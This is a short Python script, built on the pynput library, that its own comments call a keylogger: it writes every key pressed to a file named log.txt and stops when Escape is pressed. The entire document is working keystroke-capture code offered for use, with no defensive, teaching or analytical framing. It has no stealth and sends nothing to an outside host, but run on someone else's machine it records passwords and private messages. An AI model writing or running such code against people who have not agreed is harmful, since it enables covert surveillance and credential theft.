from pynput.keyboard import Key, Listener

# Function to handle key press events
def on_press(key):
    with open("log.txt", "a") as file:
        file.write(f"{key} ")  # Log the key to a file

# Function to handle key release events
def on_release(key):
    if key == Key.esc:  # Stop the keylogger when the 'Escape' key is pressed
        return False

# Set up the listener for key press and release events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
